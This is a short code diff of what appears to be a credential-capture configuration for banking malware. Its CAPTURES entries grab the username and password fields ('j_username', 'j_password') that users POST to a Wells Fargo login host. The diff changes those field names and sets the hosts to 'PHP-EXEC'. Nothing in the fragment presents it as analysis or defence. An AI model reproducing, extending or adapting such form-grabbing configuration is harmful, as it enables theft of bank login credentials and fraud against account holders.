@@ -276,15 +276,15 @@ const configExport = {
     CAPTURES: {
         loginUserName: {
             method: 'POST',
-            params: ['j_username'],
+            params: ['sko'],
             urls: '',
-            hosts: ['connect.secure.wellsfargo.com'],
+            hosts: 'PHP-EXEC',
         },
         loginPassword: {
             method: 'POST',
-            params: ['j_password'],
+            params: ['skun'],
             urls: '',
-            hosts: ['connect.secure.wellsfargo.com'],
+            hosts: 'PHP-EXEC',
         },
 
         loginUserName2: {
